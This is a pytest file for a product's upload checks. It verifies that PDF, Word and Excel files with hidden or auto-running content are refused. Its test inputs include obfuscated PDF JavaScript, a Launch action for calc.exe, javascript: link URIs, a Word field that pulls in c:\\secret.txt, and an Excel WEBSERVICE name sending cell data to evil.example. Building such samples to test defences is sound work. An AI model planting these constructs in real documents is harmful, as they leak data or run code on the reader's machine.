"""0.12.0: what the workshop's file checks missed. A malformed Office file escaped the checks (and its run went
unrecorded); JavaScript hid in PDF streams Ember didn't decode; an /OpenAction could open a web address; a WEBSERVICE
formula hid in an Excel name; web queries and data connections passed; a Word field split over two runs passed."""

from __future__ import annotations

import base64
import io
import zipfile
import zlib

import pytest
from fpdf import FPDF
from openpyxl import Workbook
from PIL import Image

from app.products import checks, images
from tests.test_workshop import a_docx, a_pdf, with_parts

WORD = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'


def a_pdf_with(body: bytes) -> bytes:
    return b"%PDF-1.5\n" + body + b"\ntrailer << /Root 1 0 R >>\n%%EOF"


def stream(dictionary: bytes, data: bytes, number: int = 2) -> bytes:
    return b"%d 0 obj << %s /Length %d >>\nstream\n%s\nendstream\nendobj\n" % (number, dictionary, len(data), data)


def test_a_real_pdf_with_links_pictures_and_an_opening_view_is_kept() -> None:
    data = a_pdf()
    assert b"/OpenAction [" in data and checks.check("page.pdf", data) == data
    photo = io.BytesIO()
    Image.new("RGB", (40, 30), (200, 80, 20)).save(photo, "JPEG")
    document = FPDF()
    document.add_page()
    document.set_font("helvetica", size=12)
    document.image(io.BytesIO(photo.getvalue()), x=10, y=10, w=40)
    document.cell(text="A shop", link="https://example.org")
    made = bytes(document.output())
    assert b"/DCTDecode" in made and checks.check("photo.pdf", made) == made  # a picture's stream isn't decoded


def test_javascript_hidden_behind_an_encoding_is_found() -> None:
    hidden = base64.a85encode(zlib.compress(b"<< /S /JavaScript /JS (app.alert(1)) >>")) + b"~>"
    body = stream(b"/Type /ObjStm /Filter [/ASCII85Decode /FlateDecode]", hidden)
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", a_pdf_with(body))
    hexed = zlib.compress(b"<< /S /Launch /F (calc.exe) >>").hex().encode() + b">"
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", a_pdf_with(stream(b"/Filter [/AHx /Fl]", hexed)))


@pytest.mark.parametrize(
    ("body", "message"),
    [
        (stream(b"/Filter /LZWDecode", b"\x80\x0b\x60\x50"), "encoded with LZWDecode, which Ember can't check"),
        (stream(b"/Filter /FlateDecode", b"not compressed at all"), "doesn't decode"),
        (stream(b"/Filter /DCTDecode", b"\xff\xd8 not a picture object"), "encoded with DCTDecode"),
        (b"1 0 obj << /Type /Catalog /Encrypt 5 0 R >> endobj", "encrypted"),
        (
            b"1 0 obj << /Type /Catalog /OpenAction << /S /URI /URI (https://tracker.example) >> >> endobj",
            "does something when it opens",
        ),
        (
            b"1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj\n5 0 obj << /S /URI /URI (https://x.example) >>"
            b" endobj",
            "does something when it opens",
        ),
        (b"1 0 obj << /Type /Catalog /OpenAction 9 0 R >> endobj", "does something when it opens"),
        (b"3 0 obj << /Type /Annot /A << /S /URI /URI (javascript:alert(1)) >> >> endobj", "web or mail link"),
        (b"3 0 obj << /A << /S /URI /URI <6a6176617363726970743a> >> >> endobj", "web or mail link"),
    ],
)
def test_pdfs_that_hide_or_start_something_are_refused(body: bytes, message: str) -> None:
    with pytest.raises(checks.Refused, match=message):
        checks.check("page.pdf", a_pdf_with(body))


def test_an_opening_that_only_shows_a_page_passes_the_action_check() -> None:
    for body in (
        b"1 0 obj << /Type /Catalog /OpenAction [3 0 R /Fit] >> endobj",
        b"1 0 obj << /Type /Catalog /OpenAction 5 0 R >> endobj\n5 0 obj [3 0 R /FitH null] endobj",
        b"1 0 obj << /Type /Catalog /OpenAction << /S /GoTo /D [3 0 R /Fit] >> >> endobj",
    ):
        with pytest.raises(checks.Refused, match="can't be opened"):  # these bare files have no pages: past the check
            checks.check("page.pdf", a_pdf_with(body))


def test_a_word_field_split_over_runs_is_read_whole() -> None:
    split = (
        f"<w:document {WORD}><w:body><w:p>"
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText>INCLUDE</w:instrText></w:r><w:r><w:instrText>TEXT "c:\\\\secret.txt"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>text</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        "</w:p></w:body></w:document>"
    )
    with pytest.raises(checks.Refused, match="pulls in other files or programs"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/document.xml": split}))
    nested = split.replace(  # the code built from a nested field's result
        "<w:r><w:instrText>INCLUDE</w:instrText></w:r>",
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE "x"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>INCLUDE</w:t></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>',
    )
    with pytest.raises(checks.Refused, match="pulls in other files or programs"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/document.xml": nested}))


def a_workbook() -> bytes:
    book = Workbook()
    book.active["A1"] = "=SUM(B1:B3)"
    out = io.BytesIO()
    book.save(out)
    return out.getvalue()


def test_excel_names_connections_and_web_queries_are_refused() -> None:
    clean = a_workbook()
    assert checks.check("budget.xlsx", clean) == clean
    with zipfile.ZipFile(io.BytesIO(clean)) as archive:
        workbook = archive.read("xl/workbook.xml").decode()
    named = workbook.replace(
        "</workbook>",
        '<definedNames><definedName name="leak">WEBSERVICE("https://evil.example/?"&amp;Sheet!A1)</definedName>'
        "</definedNames></workbook>",
    )
    with pytest.raises(checks.Refused, match="a name that reaches outside the workbook"):
        checks.check("budget.xlsx", with_parts(clean, {"xl/workbook.xml": named}))
    for part in ("xl/connections.xml", "xl/queryTables/queryTable1.xml"):
        with pytest.raises(checks.Refused, match="macros, ActiveX, embedded objects or links to other files"):
            checks.check("budget.xlsx", with_parts(clean, {part: "<x/>"}))


def test_an_office_part_of_no_known_kind_is_refused() -> None:
    with pytest.raises(checks.Refused, match=r"word/tool\.bin \(of no known kind\)"):
        checks.check("letter.docx", with_parts(a_docx(), {"word/tool.bin": b"MZ\x90\x00"}))
    with zipfile.ZipFile(io.BytesIO(a_docx())) as archive:
        types = archive.read("[Content_Types].xml").decode()
    script = '<Override PartName="/word/app.js" ContentType="application/javascript"/></Types>'
    parts = {"[Content_Types].xml": types.replace("</Types>", script), "word/app.js": "alert(1)"}
    with pytest.raises(checks.Refused, match=r"word/app\.js \(application/javascript\)"):
        checks.check("letter.docx", with_parts(a_docx(), parts))


def test_a_file_that_cannot_be_read_whole_is_refused_not_an_error() -> None:
    data = bytearray(a_docx())
    with zipfile.ZipFile(io.BytesIO(bytes(data))) as archive:
        part = archive.getinfo("word/document.xml")
    start = part.header_offset + 30 + len(part.filename.encode()) + len(part.extra) + 10
    data[start : start + 20] = b"\x00" * 20  # corrupt the compressed document
    with pytest.raises(checks.Refused, match=r"the \.docx file can't be read whole"):
        checks.check("letter.docx", bytes(data))


def a_page(width: float, height: float) -> bytes:
    document = FPDF(unit="pt", format=(width, height))
    document.add_page()
    document.set_font("helvetica", size=6)
    document.text(2, min(height, 12) - 2, "x")
    return bytes(document.output())


@pytest.mark.parametrize(
    ("width", "height", "kept"),
    [(144, 576, True), (595, 842, True), (1000, 10, False), (14_401, 600, False), (10, 10, False), (2000, 99, False)],
)
def test_a_page_no_printer_or_screen_shows_is_refused(width: float, height: float, kept: bool) -> None:
    """0.21.0: a workshop PDF 1000 x 10 points wide was kept, and one listing photo of it took 27.5 s and 3.9 GB."""
    data = a_page(width, height)
    if kept:
        assert checks.check("page.pdf", data) == data
    else:
        with pytest.raises(checks.Refused, match=r"page 1 is .* points: a page must be 18 to 14400 points"):
            checks.check("page.pdf", data)


def test_a_page_is_never_drawn_larger_than_the_pixel_limit(monkeypatch: pytest.MonkeyPatch) -> None:
    """0.21.0: the scale came from the page's height alone, so a wide page was drawn as wide as that made it."""
    monkeypatch.setattr(images, "MAX_PIXELS", 1_000_000)
    [wide] = images.pdf_pages(a_page(1000, 10), [1], height=2_250)
    assert wide.width * wide.height <= 1_000_000 and wide.width > 20 * wide.height
    [normal] = images.pdf_pages(a_page(595, 842), [1], height=1_000)
    assert normal.height == 1_000
